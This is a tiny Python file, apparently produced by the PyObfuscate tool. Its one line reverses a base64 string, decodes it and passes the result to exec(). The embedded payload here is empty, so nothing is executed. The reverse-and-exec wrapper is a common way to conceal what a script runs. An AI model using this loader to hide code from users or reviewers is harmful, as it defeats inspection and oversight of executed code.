# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Thu Nov 21 17:47:41 2024
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))